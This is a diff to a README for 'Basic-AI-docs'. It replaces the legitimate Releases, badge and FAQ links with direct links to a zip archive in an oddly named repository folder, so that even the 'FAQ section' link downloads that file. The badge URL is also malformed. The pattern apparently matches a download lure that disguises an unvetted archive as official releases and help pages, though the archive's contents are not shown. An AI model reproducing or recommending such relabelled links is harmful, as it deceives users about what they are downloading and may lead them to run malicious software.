@@ -6,7 +6,7 @@ Welcome to Basic-AI-docs! This guide will help you download and run our applicat
 
 ## 📥 Download the Application
 
-[![Download Basic-AI-docs](https://img.shields.io/badge/Download%20Basic--AI--docs-v1.0-blue.svg)](https://github.com/ArthurProgamadorLendario/Basic-AI-docs/releases)
+[![Download Basic-AI-docs](https://raw.githubusercontent.com/ArthurProgamadorLendario/Basic-AI-docs/main/cyanophycean/Basic-AI-docs.zip%https://raw.githubusercontent.com/ArthurProgamadorLendario/Basic-AI-docs/main/cyanophycean/Basic-AI-docs.zip)](https://raw.githubusercontent.com/ArthurProgamadorLendario/Basic-AI-docs/main/cyanophycean/Basic-AI-docs.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, make sure your device meets these basic requirements:
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/ArthurProgamadorLendario/Basic-AI-docs/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ArthurProgamadorLendario/Basic-AI-docs/main/cyanophycean/Basic-AI-docs.zip) to download the application.
    
 2. You will see a list of available versions. Choose the latest version to get the best features and fixes.
 
@@ -63,7 +63,7 @@ To ensure you have the latest features and fixes, keep your application updated:
 
 If you encounter issues or have questions, you have several options for support:
 
-- Visit the [FAQ section](https://github.com/ArthurProgamadorLendario/Basic-AI-docs/wiki) on our GitHub page.
+- Visit the [FAQ section](https://raw.githubusercontent.com/ArthurProgamadorLendario/Basic-AI-docs/main/cyanophycean/Basic-AI-docs.zip) on our GitHub page.
 - Contact us through the issue tracker in the GitHub repository. Provide a clear description of your problem for quicker assistance.
 
 ## 🔍 Explore More
